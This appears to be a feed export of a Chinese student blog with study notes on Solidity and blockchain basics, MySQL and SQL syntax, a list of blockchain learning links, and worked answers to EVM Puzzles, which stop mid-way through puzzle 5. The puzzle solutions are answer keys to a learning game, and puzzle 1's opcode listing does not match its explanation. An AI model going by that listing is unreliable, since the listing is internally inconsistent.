        <content type="html"><![CDATA[<p>最近别人分享了一个网站，对于一些知识巩固我觉得挺好的</p><p>网站链接我就放在<a href="https://updraft.cyfrin.io/">这里</a></p><p>学习这个网站，我就在这个博客上分享一些我的笔记</p><h2 id="一，基本常识"><a href="#一，基本常识" class="headerlink" title="一，基本常识"></a>一，基本常识</h2><p>1，Oracle: 就是充当区块链与外部世界联系的中介，允许智能合约与真实世界交互数据<br>2，Layer2: 它是构建在Laryer1之上的技术，它可以提高区块链交易的扩展性和效率，它通常在交易之外执行，就是为了避免交易拥挤和一些费用产生，如比特币闪电网络<br>3，DAPP：去中心化的应用，通常在区块链上运行，就类比我们现实生活中的app，就是应用<br>4，智能合约：它使自动执行的合约，在区块链上运行<br>5,web3: 它是一个未获许可依赖于去中心化的，也是一个术语，它开创了一个抗审查和透明协议和交易的一个领域<br>6，Chainlink: 它与区块链上的预言机，它通过链上的逻辑和链下的数据和计算，确保这个逻辑和这个数据保持去中心化<br>7，一个区块包括，区块头，区块体</p><blockquote><p>区块头：nonce(交易的计数),前一个哈希值（注意：创世区块没有父哈希值）时间戳，三个树根（状态树根：记录所有账户的余额，信息等，交易树根，收据树根，币基（识别矿工的地址），难度目标（表示挖矿的难度）</p></blockquote><blockquote><p>区块体：包含了这个区块的所有交易哈希值</p></blockquote><p>8，以以太坊为例：从上到下分为：区块链，区块，交易</p><blockquote><p>交易：一个账户向另一个账户发送信息的行为，当发起交易时，以太坊客户端或者钱包会生成交易数据.交易数据包括：nonce(发送方的交易数量)，gasPrice(发送方愿意支付的gas费用)，gasLimit(发送方设置本次最大的gas费用)，to(接收方的地址)，value(要发送的钱)，data(智能合约的字节码)，v r s (交易的签名，又发送方的私钥产生)<br>9，软硬分叉：从字面上理解，就是一个妥协，一个强硬，区块链上的软硬分叉正是因为时代的更新，链上出现了分歧，那么如何解决呢，这是就出现了分叉，从项目上来说，一个项目的分叉（fork），分为一个子项目，那么开发人员就会分别进行这俩个项目，但是区块链上，就不同，就出现了俩种概念</p></blockquote><ul><li>软分叉：向前兼容，旧版本接受新版本的东西，但是在旧版本的算力要大于51%，才能产生软分叉，最后链比较长的保留</li><li>硬分叉：不兼容，旧版本和新版本是完全分开的，它不需要算力大于51%（因为即使旧版本的链长于新版本，但是也不影响新版本，因为新版本不会接受旧版本的东西，而旧版本夜也不会接受新版本的东西）,直接产生硬分叉</li></ul><h2 id="二，solidity的知识查漏补缺"><a href="#二，solidity的知识查漏补缺" class="headerlink" title="二，solidity的知识查漏补缺"></a>二，solidity的知识查漏补缺</h2><p>1，我感觉学了Java的话会很好理解。<br>2，使用结构体时，采用实例化对象，如果对象很多，就采用动态数组，这样就比较方便<br>  eg,定义一个名Person的结构体，用Person[] list_of_people ,那么list_of_people数组就可以储存多个Person对象<br>3，注意到了一个智能问答小助手，名为<a href="https://www.phind.com/search?home=true">phind</a>,就是可以用它来检查你的合约是否缺逗号问题啥的<br>4，数据储存：calldata，它是只能读，不能调用使用。但是在合约中内存memory可以允许读写，让变量改变在函数中，为了修改calldata我们必须先将它储存到内存memory中。calldata和memory，都是临时储存变量。Storage储存变量，它是持久的储存在区块链上，被外部调用时会保留它们的值，任何在函数外部声明的变量都会隐式的转化储存变量，但是不能在函数中定义使用Storage,只能使用calldata和memory。<br>5，映射，在前面我们也了解到，用动态数组储存Person对象，但是如果有很多对象，而我们要找其中一个，就必须从头历遍，这样就会佷麻烦，所以就出现了映射，构造一个映射对象，将一个变量和另一个变量联系起来，提供噶我们的查找效率<br>6，合约实例部署，使用new关键字，类似于java的理解。首先你将要部署的合约A和我们的工厂合约B放在一起，然后在工厂合约B中用A定义a，再定义一个函数create，里面写a&#x3D;new A();这样一个合约实例就部署出来了，没使用create的时候，可以看见a的地址为0，使用后就可以发现a就有地址了，也可以说是，我们把合约A部署出来了，还有一种简单的方法，采用import关键字，这样就可以不用把合约A和合约B写在一起了，直接就是improt”.&#x2F;A”</p><blockquote><p>import的使用方法：如果要导入的合约只包含一个合约，就可以直接使用 import”.&#x2F;“,如果是要导入的合约中包括很多种合约，然后你要使用哪种合约，就在{}里写，在” “写来源，就是大合约，import {A,B} from “.&#x2F;A”;</p></blockquote><p>7，继承于重写：俩个关键字 override，virtual，例如A is B{}；A合约继承B合约，我们要修改A中继承B合约的函数，那么，我们就要在A合约中要修改的函数加上override关键字，在B合约被修改的函数中加上vritual关键字，这样就不会报错<br>8，一个可以计算，wei,Gwei,Ether,之间的转化的工具：<a href="https://eth-converter.com/">Converter</a>;<br>9,gas:交易所产生的手术费，如果一个交易被revert了，那么它的gas就不会返回，为了解决这个问题，以太坊就有一个功能，自己设置能承担的最大gas费用<br>10，库：真的是查漏补缺了，这个库，我还是第一次了解到，库就是为了简化智能合约，使用Library关键字，定义一个Math的库，Library Math{};里面就放函数，在其他合约中可以直接使用库.函数名，直接进行调用，或者使用use for ,例如要在合约中uint类型的变量可以使用Math库，就直接use Math for uint;这样合约中的uint类型的变量就可以使用Math库中的函数，uint类型.函数名，（注意的先使用import导入库）<br>11，注意合约的solidity的版本，在0.6版本时，没有对溢出的一个检查，但是使用SafeMath.sol可以对它进行检查。在solidity版本0.8以上时，它有检查上溢和下溢的功能，所以就不需要使用SafeMath.sol<br>12,重置阵列：使用new关键字，即将每个元素都重置为零，例如：fouder &#x3D; new address<a href=""></a>;还有一种delete.直接删除变量的值<br>13，modifier:修饰器，如果合约较长，而我们又必须每个检查合约的所有者，使用require的话会很繁杂，所以就有修饰器了，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == onwer,&quot;Sender is not owner&quot;);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里有个_,如果函数使用了onlyOwner的修饰符，那么就会先执行_以前的代码，如果成功，再执行函数中的代码<br>14，自定义错误：从solidity的0.8.4开始，引入了自定义的错误，用于节省Gas并提高更加具体的错误信息，revert用于手动触发异常，例如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw (uint amount )&#123;</span><br><span class="line">  if(amount&gt;balance)&#123;</span><br><span class="line">    revert (&quot;Insufficient Balance&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而自定义错误，用于提供更详细和节省Gas的错误信息，例如:error InsufficientBalance(uint requested,uint available);使用的时候用revert即可：revert InsufficientBalance(requested:amount,available:balance);<br>15，receive(): 适用于合约中有它，且没有msg.data的存在，而fallback()就是相反<br>16，一些有用的小助手<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>谷歌开发的一个智能软件：<a href="https://gemini.google.com/app">Gemini</a>；<br>一个社区的检索问题：<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>一个社区的全球交流平台：<a href="https://stackoverflow.com/">stackoverflow</a>;<br>web一个知识构建平台：<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&#39;数据库原理及应用进阶&#39;</title>
      <link href="/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/"/>
      <url>/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="MySQL内置函数"><a href="#MySQL内置函数" class="headerlink" title="MySQL内置函数"></a>MySQL内置函数</h2><p>一，含义：是指一段可以直接被另一段程序调用的程序或代码</p><p>二，分类：</p><ul><li><p>字符串函数 （使用时，前面加select）eg,select concat（’he’,’DE’）</p><ul><li>CONCAT（S1,S2,S3）：字符串拼接，将S1,S2,S3拼接成一个字符串</li><li>LOWER（str）：将字符串str全部转化为小写</li><li>UPPER(str) : 将字符串str全部转化为大写</li><li>LPAD（str,n,pad）:左填充，用字符串pad对str的左边进行填充，达到n个字符串的长度</li><li>RPAD (str,n,pad) :右填充，用字符串pad对str的右边进行填充，达到n个字符串的长度</li><li>TPIM（str）：去掉字符串头部和尾部的空格</li><li>SUBSTRING(str,start,len):返回从字符串str从start位置起的len个长度的字符串</li><li>例如，如果要单个工号前面添加0000，就使用update 表名 set workno &#x3D; lpad(workno,5,’0’)</li></ul></li><li><p>数值函数</p><ul><li>CEIL(x):向上取整</li><li>FLOOR（x）:向下取整</li><li>MOD (x,y): 返回x&#x2F;y的模</li><li>RAND（）：返回0-1内的随机数</li><li>ROUND（x,y）：求x四舍五入的值，暴露y位小数   </li><li>例如随机生成一个6位数的验证码，select lpad（round(rand()<em>1000000,0)，6，’0’）,首先进行生成0-1的随机数，然后乘以1000000就变成了一个六位数带有小数的数，在用round（）四舍五入消除小数，注意，如果是0.012345</em>1000000就会只有5位数，所以我们要进行填充，使用lpad或者rpad都可以</li></ul></li><li><p>日期函数</p><ul><li>CURDATE()：返回当前日期</li><li>CURTIME(): 返回当前时间</li><li>NOW(): 返回当前日期和时间</li><li>YEAR(date)：获取指定date的年份</li><li>MONTH(date): 获取指定date的月份</li><li>DAY（date）：获取指定date的日期</li><li>DATE_ADD(date,INTERVAL expr type):返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</li><li>DATEDIFF(date1,date2):返回起始时间date1,和结束时间date2之间的天数</li><li>例如，从当前日期往后推70天，select date_add(now(),INTERVAL 70 DAY);查询员工入职的天数并降序排序，select name datediff(curdate(),entrydate) as ‘entrydays’ from 表 order by entrydays desc;使用datediff函数，为了方便排序，用as 给计算的天数起个别名，方便order by 使用</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库原理及应用基础</title>
      <link href="/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>1，数据是数据库储存的基本对象，而数据库则是长期储存在计算机中，有组织，可共享的大量数据的集合<br>   基本特点：永久储存，有组织，可共享，冗余度小，易扩展<br>2，一些基本模型术语：</p><ul><li>关系（r）：就是一个整体的表，可对关系的描述:关系名 (属性1，属性2…..)；关系名就是表名；<ul><li>关系完整性约束条件：实体，参照，用户定义完整性</li></ul></li><li>属性：表中的一列为一个属性</li><li>域：属性的取值范围，一个具有相同类型的值集合</li><li>元组（t）：表中的一行</li><li>主码：也叫码键，表中的某个属性组，它可以唯一确定一个元组，就是一个比较特殊可以用它来确定唯一的值，有点类似于c中的指针；</li><li>分量：元组中的一个属性值</li><li>关系模式：对关系的描述，也叫联系<br>3，数据库系统里有三种模式：<br>a,模式（逻辑模式，概念模式）：数据库中的全体数据逻辑结构和特征的描述，与物理储存的细节和硬件环境，与具体的应用程序，开发环境及高级程序设计语言无关，它是数据库系统模式的中间层<br>b，外模式（子模式，用户模式）：数据库用户使用的局部数据的逻辑结构和特征的描述，是与某一应用有关的数据的逻辑表示，<strong>每个用户</strong>只能看见和访问对应的外模式中的数据，用户只能与外模式建立联系<br>c，内模式（储存模式，物理模式）：是数据物理结构和储存方式的描述，是数据在数据库内部的表示方式：记录的储存方式，索引的组织方式，数据是否压缩储存，数据是否加密，数据储存记录记录结构的规定<blockquote><p>用户-外模式-模式-内模式</p></blockquote></li></ul><p>4，二级映像，三级模式<br>4，<strong>E-R图</strong>：实体用方框，属性用椭圆，关系用菱形</p><hr><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="基本含义："><a href="#基本含义：" class="headerlink" title="基本含义："></a>基本含义：</h3><p>数据模型组成的三要素：数据结构，数据操作，数据的完整性约束条件<br>数据库(DB)：储存数据的仓库<br>数据库管理系统（DBMS）<br>数据库系统（DBS）：包含了数据库和数据库管理系统<br>型：对某一类数据的结构和属性的说明，值：对型的一个具体赋值<br>笛卡尔积：域的相乘，就是域之间的排列组合<br>基数：一个域允许的不同取值的个数。如域d1,的基数为2，域d2的基数为3，则总基数为2*3&#x3D;6；<br>MySQL: 操纵何管理数据库的软件，下载安装后，在终端打开，用：net start mysql80,停止用：net stop mysql80<br>MySQL数据库模型：<br>1，关系型数据库（RDBMS）：建立在关系型模型基础上，由多张相互连接的二维表组成的数据库<br> <a href="http://www.mysql.com/">下载安装MySQL</a><br> 1,登录数据库命令：cd  C:\Program Files\MySQL\MySQL Server 8.0\bin（由于我配置了环境变量，所这步可以省略）<br> 2, 客户端连接，输入mysql -h localhost -u root -p,进入数据库,也可以直接在开始直接打开MySQL的命令提示板输入密码即可<br> 3,输入show databases; 查看当前数据库列表<br> 4,退出执行命令：exit或者quit</p><blockquote><p>一些专业的名词解释：1，索引：加快查询速度的有效方式，用户可以在基本表上建立一个或者多个索引，以提供存取路径，索引是属于内模式的范畴。唯一的索引：使用UNIQUE关键字，每个索引值对应唯一一条数据记录 2，视图：视图是从一个或者几个基本表导出的表，数据库只存在视图的定义而不是存放视图对应的数据，基本表中的数据发生变化，从视图查询出的数据也会随之变化。</p></blockquote><h3 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h3><p>SQL：是用于管理数据库的标准化编程语言，它用于查询，更新，插入和删除数据库中的数据，操作数据库的语言，不管什么数据库管理系统（DBMS），SQL都实用<br>以下所写都是用的关系模型；</p><h4 id="一，SQL的通用语法："><a href="#一，SQL的通用语法：" class="headerlink" title="一，SQL的通用语法："></a>一，SQL的通用语法：</h4><p>a，可单行或多行书写，一分号结尾<br>b,可以使用空格或者缩进来增强语句的可读性<br>c,MySQL数据库的SQL语句部区分大小写，关键字建议大写<br>d,注释：</p><ul><li>单行注释：– 注释内容或 #注释内容（MySQL特有）</li><li>多行注释：&#x2F;* 注释内容*&#x2F;</li></ul><h4 id="二，SQL的分类："><a href="#二，SQL的分类：" class="headerlink" title="二，SQL的分类："></a>二，SQL的分类：</h4><h5 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h5><p>1，DDL：数据定义语言，用来定义数据库对象（数据库，表，字段）</p><p>a,DDL-数据库操作：</p><ul><li>查询：<ul><li>查询所有数据库：SHOW DATABASES；</li><li>查询当前数据库：SELECT DATABASE();</li></ul></li><li>创建：<ul><li>CREATE DATABASE[IF NOT EXISTS]数据库名[DEFAULT CHARSET 字符集] [COLLATE 排序规则]；<blockquote><p>括号代表可以有的，eg:CREATE DATABASE IF NOT EXISTS itcast DEFAULT CHARSET utf8mb4;也可以直接创建CREATE DATABASE itcast;</p></blockquote></li></ul></li><li>删除：<ul><li>DROP DATABASE[IF EXISTS]数据库名；</li></ul></li><li>使用：<ul><li>USE 数据库名；顾名思义切换到一个数据库中</li></ul></li></ul><p>b,DDL-表操作</p><ul><li>查询<ul><li>查询当前数据库所有表：SHOW TABLES;</li><li>查询表的结构：DESC 表名；</li><li>查询指定表的建表语句 SHOW CREATE TABLE 表名；</li></ul></li><li>创建<ul><li>CREATE TABLE 表名（<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段n 字段类型 COMMENT 字段n注释<br>）[COMMENT 表注释] ；<br>（注意：最后一个字段没有逗号，字段的注释必须用’’围住,可以先在记事本上写，然后直接复制）<br>mysql&gt; CREATE TABLE tb_user(<br>-&gt; id int COMMENT ‘编号’<br>-&gt; ) COMMENT ‘用户表’;</li></ul></li></ul><p>c,DDL-表操作-数据类型</p><ul><li>数值类型（参照Java）<ul><li>TINYINT(1byte)，SMALLINT(2bytes),MEDIUMINT(3bytes)，INT(4bytes),BIGINT(8bytes),FLOAT(4bytes),DOUBLE(8bytes)</li><li>有符号（SIGNED），范围有负数，无符号（UNSIGNED），范围无负数，eg:TINYINT 有符号：-128<del>127，无符号：0</del>255；</li><li>举例：年龄：age TINYINT UNSIGNED；分数：score DOUBLE(4,1)，4为标度，总共的数字个数，1为精度，小数的位数</li></ul></li><li>字符串类型<ul><li>CHAR ：定长字符串；VARCHAR：变长字符串；TEST:长文本数据；</li><li>CHAR(10),性能好；VARCHAR(10)</li></ul></li><li>日期时间类型<ul><li>DATE:范围：1000-01-01至9999-12-31，格式：YYYY-MM-DD  日期值  eg:brithday DATE</li><li>TIME:范围：-838：59：59至838：59：59，格式：HH:MM:SS  时间值</li><li>YEAR:范围：1901至2155   格式：YYYY 年份值</li><li>DATETIME:混合日期和时间 格式：YYYY-MM-DD HH-MM-SS</li><li>TIMESTAMP :混合日期和时间，时间戳 格式：YYYY-MM-DD HH-MM-SS</li></ul></li></ul><p>d,DDL-表操作-修改</p><ul><li>添加字段：ALTER TABLE 表名 ADD 字段名 类型（长度）[COMMENT 注释] [约束 ]；</li><li>修改字段<ul><li>修改数据类型 ： ALTER TBALE 表名 字段名 新数据类型（长度）；</li><li>修改字段名，字段类型 ：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型（长度）[COMMENT 注释] [约束 ]；</li></ul></li><li>删除字段 : ALTER TABLE 表名 DROP 字段名；</li><li>修改表名 ：ALTER TABLE 表名 RENAME TO 新表名；</li><li>删除：<ul><li>删除表 ：DROP TABLE [IF EXISTS]表名；</li><li>删除指定表，并重新创建该表 : TRUNCATE TABLE 表名；（一般不使用它，因为它会重新创建该表，只是没有结构）<br>MySQL 图形化界面：DataGrip,使用它就可以直接写了</li></ul></li></ul><hr><h5 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h5><p>2，DML：数据操作语言，用来对数据库表中的数据进行修改  涉及的关键字：INSERT INTO<br>a,DML-添加数据：</p><ul><li>给指定字段添加数据：INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…）；</li><li>给全部字段添加数：INSERT INTO 表名 VALUES（值1，值2…）；值1，就是表中第一列</li><li>批量添加数据：<ul><li>INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…），（值1，值2…），（值1，值2…）；</li><li>INSERT INTO 表名 VALUE(值1，值2)，（值1，值2…）（值1，值2…）；<br>b，DML-修改数据</li></ul></li><li>UPDATE 表名 SET 字段名1 &#x3D; 值1，字段名2 &#x3D; 值2，…[WHERE 条件]；<br>c,DML-删除数据</li><li>DELETE FROM 表名 [WHERE 条件]；</li></ul><hr><h5 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h5><p>3，DQL：数据查询语言，用来查询数据库中的表的记录   涉及的关键字：SELECT</p><p>a,DQL-语法（也是编写顺序）：<br>SELECT<br>       字段列表<br>FROM<br>       表名列表<br>WHERE<br>       条件列表<br>GROUP BY<br>       分组字段列表<br>HAVING<br>       分组后条件列表<br>ORDER BY<br>       排序字段列表<br>LIMIT<br>       分页参数</p><p>b,DQL-基本查询</p><ul><li>查询多个字段<ul><li>SELECT 字段1，字段2，字段3…. FROM 表名；</li><li>SELECT *FROM 表名；查询所有字段</li></ul></li><li>设置别名：SELECT 字段1[AS 别名1]，字段2[AS 别名2]…FROM 表名；</li><li>去除重复记录：SELECT DISTINCT 字段列表 FROM 表名；<br>c,DQL-条件查询</li><li>语法：SELECT 字段列表 FROM 表名 WHERE 条件列表；</li><li>条件：where后面可以跟比较运算符（&gt;,&lt;,!&#x3D;,is NULL,BETWEEN    AND ，IN(),LIKE 占位符 _ % ）和逻辑运算符（AND ,&amp;&amp;,OR,||,NOT,!）</li><li>in(),就是括号里的条件任意满足其一即可，between最小值 and 最大值,like 模糊匹配 下划线_占一个字符，百分号% h后跟谁查谁，最后一个字符，例如查询名字为俩个字的员工：like ‘_ _’;  例如查身份证最后一个字符为X：like ‘%x’;</li></ul><p>c,DQL-聚合函数</p><ul><li>介绍：将一列数据作为一个整体，进行纵向计算</li><li>常见的聚合函数<ul><li>count ：统计数量</li><li>max :最大值</li><li>min : 最小值</li><li>avg : 平均值</li><li>sum : 求和</li></ul></li><li>语法<ul><li>SELECT 聚合函数（字段列表）FROM 表名；</li></ul></li></ul><p>d,DQL-分组查询</p><ul><li>语法：SELECT 字段列表 FROM 表名[WHERE 条件] GROUP BY 分组字段名 [HAVING 分组后过滤条件]；</li><li>where与having区别：<ul><li>执行时机不同：where是分组前进行过滤，不满足where条件，不参与分组；而having是分组后对结果进行过滤</li><li>判断条件不同：where不能对聚合函数进行判断，而having可以；</li><li>注意事项：执行顺序：where&gt;聚合函数&gt;having; 分组后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</li></ul></li></ul><p>e,DQL-排序查询</p><ul><li>语法: SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1，字段2，排序方式二；</li><li>排序方式：<ul><li>ASC: 升序（默认值）</li><li>DESC: 降序</li></ul></li></ul><p>f,DQL-分页查询</p><ul><li>语法：SELECT 字段列表 FROM 表名 LIMIT 起始索引，查询记录数；</li><li>注意：<ul><li>起始索引从零开始，起始索引 &#x3D; （查询页码-1）*每页显示记录数</li><li>分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中式LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接写limit 10</li></ul></li></ul><p>h,DQL-执行顺序<br> FROM<br>    表名列表<br>WHERE<br>    条件列表<br>GROUP BY<br>     分组字段列表<br>HAVING<br>     分组后条件列表<br>SELECT<br>     字段列表<br>ORDER BY<br>     排序字段列表<br>LIMIT<br>     分页参数</p><hr><h5 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h5><p>4，DCL：数据控制语言，用来创建数据库用户，控制数据库的访问权限,就是控制有那些用户可以访问数据库</p><p>a,DCL-用户管理</p><ul><li>查询用户：USE mysql; SELECT *FROM user;</li><li>创建用户：CREATE USER ‘用户名‘@’主机名’ IDENTIFIED BY ‘密码’；</li><li>修改用户密码：ALTER USER ‘用户名‘@’主机名’ IDENTIFIED WITH mysql_native_password BY ‘新密码’；</li><li>删除用户：DROP USER ‘用户名‘@’主机名’；</li><li>主机名：localhost 代表只能在当前主机访问数据库，% 代表可以在任意主机上访问数据库；</li></ul><p>b,DCL-控制权限</p><ul><li>ALL ,ALL PRIVILEGES : 所有权限</li><li>SELECT : 查询数据</li><li>INSERT ：插入数据</li><li>UPDATE : 修改数据</li><li>DELETE : 删除数据</li><li>ALTER : 修改表</li><li>DROP : 删除数据库，表，视图</li><li>CREATE : 创建数据库，表</li><li>主要使用：<ul><li>查询权限：SHOW GRANTS FOR ‘用户名‘@’主机名’；</li><li>授予权限：GRANT 授权列表 ON 数据库名.表名 TO ‘用户名‘@’主机名’;</li><li>撤销权限：REVOKE 权限列表 ON 数据库名.表名 FROM ‘用户名‘@’主机名’；</li></ul></li></ul><hr><p>（由于后面要学习solidity，所以就没有再更新数据库原理了）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链入门知识常用链接</title>
      <link href="/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>推荐这个博主的整个入门区块链的方向，里面有个思维导图，值得一看.<a href="https://dukedaily.github.io/solidity-expert/cn/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html">点击</a></li><li>僵尸编程学习<a href="https://cryptozombies.io/">点击</a></li><li>WTF学院，学习 EVM ，solidity值得一看.<a href="https://www.wtf.academy/">点击</a></li><li>Ethernaut靶场练习，<a href="https://ethernaut.openzeppelin.com/">点击</a></li><li>damn-vulnerable-defi靶场练习，<a href="https://www.damnvulnerabledefi.xyz/">点击</a></li><li>EVM PUZZLES题解参考链接，<a href="https://learnblockchain.cn/article/5533">点击1</a>  <a href="https://dukedaily.github.io/solidity-expert/cn/09_EVM%E8%AF%A6%E8%A7%A3/02-evm-puzzles.html">点击二</a></li><li>evm code指令速查 <a href="https://www.evm.codes/?fork=shanghai">点击</a></li><li>注:自毁函数将会被弃用,<a href="https://eips.ethereum.org/EIPS/eip-4758">点击1</a>,<a href="https://eips.ethereum.org/EIPS/eip-6049">点击2</a></li><li><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">闪电贷的极简入门</a></li><li>关于solidity的一些基本问题,用于自查，<a href="https://www.rareskills.io/post/solidity-interview-questions">点击</a></li><li>将本地文件上传到github上，<blockquote><p>要有一个自己想上传的仓库，<br>cd 要上传的文件名，git remote add origin (ssh下的仓库地址)，<br>切换分支，主要是看仓库是master,还是main, 还是其他的分支，git branch -M main , 切换到main分支上<br>直接上传到分支上 git push -u origin main<br>即可</p></blockquote></li></ul><p>一些智能的工具：<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>谷歌开发的一个智能软件：<a href="https://gemini.google.com/app">Gemini</a>；<br>一个社区的检索问题：<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>一个社区的全球交流平台：<a href="https://stackoverflow.com/">stackoverflow</a>;<br>web一个知识构建平台：<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p><p><a href="https://www.rareskills.io/post/solidity-interview-questions">solidityquestion</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM puzzle</title>
      <link href="/2024/08/30/EVM-puzzle/"/>
      <url>/2024/08/30/EVM-puzzle/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM-PUZZLE"><a href="#EVM-PUZZLE" class="headerlink" title="EVM PUZZLE"></a>EVM PUZZLE</h1><p><a href="https://github.com/fvictorio/evm-puzzles">运行游戏</a></p><h2 id="puzzle-1-CALLVALUE"><a href="#puzzle-1-CALLVALUE" class="headerlink" title="puzzle 1 CALLVALUE"></a>puzzle 1 CALLVALUE</h2><p>题目：</p><pre>pc     opcode  opcode name01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>输入恰当的value，使得题目的 opcode 正确执行，直到执行STOP</p><p>分析：CALLVALUE实际上就是msg.value,它会将msg.value存储到栈顶,而JUMP会读取栈顶值，并跳转到相应的字节地址，由JUMPDEST承接,所以我们只需要让msg.value&#x3D;&#x3D;8即可</p><hr><h2 id="puzzles-2-CODESIZE"><a href="#puzzles-2-CODESIZE" class="headerlink" title="puzzles 2 CODESIZE"></a>puzzles 2 CODESIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>msg.value是多少？</p><p>分析：CALLVALUE存储值到栈顶，STACK：[x]，CODESIZE获取当前EVM环境中的操作码SIZE，每个OPCODE为1byte，我们此时内存中共10个操作码，因此执行CODESIZE后，会向栈顶存入10，STACK：[10, x]，SUB会执行减法操作，并将结果如栈，STACK：[10 - x]<br>JUMP会跳到06字节，因此我们需要 10 - x &#x3D; 6，推导出：x &#x3D; 4，即msg.value为4</p><hr><h2 id="puzzles-3-CALLDATASIZE"><a href="#puzzles-3-CALLDATASIZE" class="headerlink" title="puzzles 3 CALLDATASIZE"></a>puzzles 3 CALLDATASIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      36      CALLDATASIZE01      56      JUMP02      FD      REVERT03      FD      REVERT04      5B      JUMPDEST05      00      STOP</pre><p>calldata是多少？</p><p>分析：JUMPDEST跳转到04，所以我们只要保证calldata到size为4即可，内容不限。即len(msg.data) &#x3D;&#x3D; 4,msg.data&#x3D;&#x3D;0x11223344</p><blockquote><p>补充：一个字节代表8位二进制数，一个16进制数代表4位二进制数，所以俩个16进制的数就代表一个字节</p></blockquote><hr><h2 id="puzzles-4-XOR"><a href="#puzzles-4-XOR" class="headerlink" title="puzzles 4 XOR"></a>puzzles 4 XOR</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      18      XOR03      56      JUMP04      FD      REVERT05      FD      REVERT06      FD      REVERT07      FD      REVERT08      FD      REVERT09      FD      REVERT0A      5B      JUMPDEST0B      00      STOP</pre><p>value是多少？</p><p>分析:CALLVALUE获取数值后入栈，STACK：[x],CODESIZE获取数值为12入栈，STACK：[12, x]<br>异或操作：<br>12：0000，1100<br>0A：0000，1010<br>x： 0000，0110 &#x3D;》6，所以答案为：6,即value为6</p><hr><h2 id="puzzles-5-JUPM1"><a href="#puzzles-5-JUPM1" class="headerlink" title="puzzles 5 JUPM1"></a>puzzles 5 JUPM1</h2><p>题目：</p><pre>        pc      opcode      opcode name00      34          CALLVALUE01      80          DUP102      02          MUL03      610100      PUSH2 010006      14          EQ07      600C        PUSH1 0C09      57          JUMPI0A      FD          REVERT0B      FD          REVERT0C      5B          JUMPDEST0D      00          STOP0E      FD          REVERT0F      FD          REVERT</pre><p>value是多少？</p><p>分析：</p><ul><li>CALLVALUE，STACK-&gt; [x]</li><li>DUP1：STACK-&gt; [x，x]</li><li>MUL：STACK-&gt; [mul_result]</li><li>PUSH2 0100：STACK-&gt; 